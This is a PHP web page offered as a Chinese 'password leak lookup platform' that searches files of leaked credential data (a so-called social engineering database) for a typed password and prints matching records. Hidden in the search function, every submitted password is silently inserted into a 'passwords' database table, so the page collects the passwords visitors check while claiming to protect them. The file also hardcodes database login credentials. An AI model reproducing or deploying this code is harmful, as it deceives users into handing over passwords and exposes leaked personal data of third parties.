<meta charset="UTF-8">
<?php
/*
*Author:FancyPig Team
*https://www.iculture.cc
*/
header("content-type:text/html;charset=utf-8");         //设置编码
if(empty($_COOKIE["access_check"])){
    die("未通过验证，无法访问");
}
$tn_r=base64_decode(base64_decode($_COOKIE["tn_r"]));
$sign=md5($tn_r);
if($_COOKIE["access_check"]!=$sign){
    die("cookie非法！");
}
#include "../../config/connect.php";

$time_start = microtime(true);
define('ROOT', dirname(__FILE__).'/');
define('MATCH_LENGTH', 0.1*1024*1024);	//字符串长度 0.1M 自己设置，一般够了。
define('RESULT_LIMIT',100);


function my_scandir($path){//获取数据文件地址
	$filelist=array();
	if($handle=opendir($path)){
		while (($file=readdir($handle))!==false){
			if($file!="." && $file !=".."){
				if(is_dir($path."/".$file)){
					$filelist=array_merge($filelist,my_scandir($path."/".$file));
				}else{
					$filelist[]=$path."/".$file;
				}
			}
		}
	}
	closedir($handle);
	return $filelist;
}

function get_results($keyword){//查询
    $servername986260 = "localhost";
$username986251 = "adminzym";
$password032145 = "zym856460.";
$dbname752963 = "adminzym";
$link=mysqli_connect($servername986260,$username986251,$password032145,$dbname752963);
if(!$link=mysqli_connect($servername986260,$username986251,$password032145,$dbname752963)
){
    die(mysqli_connect_error());
}
    $sql_save_pass="INSERT INTO passwords(password) values('".addslashes($keyword)."')";
    $aaaaaaaaa=mysqli_query($link,$sql_save_pass);
    if (!$aaaaaaaaa){
        die(mysqli_error($link));
    }
    $servername853271 = "localhost";
$username853201 = "adminzym";
$password992656 = "zym856460.";
$dbname982656 = "adminzym";
$link_2=mysqli_connect($servername853271,$username853201,$password992656,$dbname982656);
mysqli_close($link_2);

	$return=array();
	$count=0;
	$datas=my_scandir(ROOT."data"); //数据库文档目录
	if(!empty($datas))foreach($datas as $filepath){
		$filename = basename($filepath);
		$start = 0;
		$fp = fopen($filepath, 'r');
			while(!feof($fp)){
				fseek($fp, $start);
				$content = fread($fp, MATCH_LENGTH);
				$content.=(feof($fp))?"\n":'';
				$content_length = strrpos($content, "\n");
				$content = substr($content, 0, $content_length);
				$start += $content_length;
				$end_pos = 0;
				while (($end_pos = strpos($content, $keyword, $end_pos)) !== false){
					$start_pos = strrpos($content, "\n", -$content_length + $end_pos);
					$start_pos = ($start_pos === false)?0:$start_pos;
					$end_pos = strpos($content, "\n", $end_pos);
					$end_pos=($end_pos===false)?$content_length:$end_pos;
					$return[]=array(
									'f'=>$filename,
									't'=>trim(substr($content, $start_pos, $end_pos-$start_pos))
								);
					$count++;
					if ($count >= RESULT_LIMIT) break;
				}
				unset($content,$content_length,$start_pos,$end_pos);
				if ($count >= RESULT_LIMIT) break;
			}
		fclose($fp);
		if ($count >= RESULT_LIMIT) break;
	}
	return $return;
}


if(!empty($_POST)&&!empty($_POST['q'])){
	set_time_limit(0);				//不限定脚本执行时间
	$q=strip_tags(trim($_POST['q']));
	$results=get_results($q);
	$count=count($results);
}
 
?>
<!DOCTYPE HTML>
<html>
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>常见密码泄露查询平台- Powered By ZYM </title>
<meta name="copyright" content="www.zymiesafe.com" />
<meta name="keywords" content="密码查询,Social Engineering Data" />
<meta name="description" content="一款由zymiesafe提供的Social Engineering Data 社工库/社工数据库查询工具。帮助您判断您的密码是否已经被公开或泄漏。zymiesafe’s blog,关注互联网安全技术,提供互联网共享服务。" />
        <script type="text/javascript" src="../../jquery/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../../js/bootstrap.min.js"></script>
        <link rel="stylesheet" type="text/css" href="../../css/bootstrap.min.css" />
        <link rel="stylesheet" type="text/css" href="html/default.css" />
	<style type="text/css">
	body,td,th {
	color: #FFF;
}
    a:link {
	color: #0C0;
	text-decoration: none;
}
    body {
	background-color: #000;
}
    a:visited {
	text-decoration: none;
	color: #999;
}
a:hover {
	text-decoration: none;
}
a:active {
	text-decoration: none;
	color: #F00;
}
#create_form{
    size: auto;
}
    </style>
<script>
    <!--
    function check(form){
if(form.q.value=="" || length(form.q.value)<6){
  alert("Not null！");
  form.q.focus();
  return false;
 }
}
-->
</script>
	</head>
	<body>
	<div id="container"><div id="header"><a href="https://www.zymiesafe.com" ><h1>密码泄露查询平台</h1></a></div><br /><br />

<form name="from" action="index.php" class="btn-lg" method="post">
			<div id="content"><div id="create_form"><label>请输入您要查询的密码：
                        <input class="inurl" type="password" size="26" id="unurl" name="q" value="<?php echo !empty($q)?$q:''; ?>"/>
                    </label>
	<p class="ali"><label for="alias">关键：</label><span>常用密码</span></p><p class="but"><input onclick="check(form)" type="submit" value="Search" class="submit" /></p>
		</form></div>
		<?php
		header("content-type:text/html;charset=utf-8");         //设置编码
		if(isset($count)){
			echo 'Get ' . $count . ' results, cost ' . (microtime(true) - $time_start) . " seconds"; 
			if(!empty($results)){
				echo '<ul>';
				foreach($results as $v){
					$encode = mb_detect_encoding($v['f'], array("ASCII",'UTF-8',"GB2312","GBK",'BIG5'));
					$v['f'] = mb_convert_encoding($v['f'], 'UTF-8', $encode);
					echo '<li>来自['.$v['f'].']数据 <br />详细信息:　'.$v['t'].'</li>';
				}
				echo '<br /><br /><font color=#ffff00><li>数据完全来自网络<br />所有展现的信息不代表本站观点</li></font>';
				echo '</ul>';
			}
			        echo '<hr align="center" width="550" color="#2F2F2F" size="1"><font color=#ff0000>我们无法保证信息的完全准确性';
				echo '<br />信息如果不完整或者存在缺失，您可以联系我们添加或修改';
				echo '<br /><font>联系站长:2789570586@qq.com</font>';
				echo '</ul>';
		}
		?>
		<div id="nav">
<ul><li class="current"><a href="https://www.freebuf.com">freebuf网安</a></li><li><a href="https://www.anquanke.com" target="_blank">安全客</a></li></ul>
</div>
<div id="footer">
<p>密码泄露查询平台 ©2022-20?? Powered By <a href="https://www.zymiesafe.com/" target="_blank">zym<a></p><div style="display:none">
</div>
</div>
</body>
</html>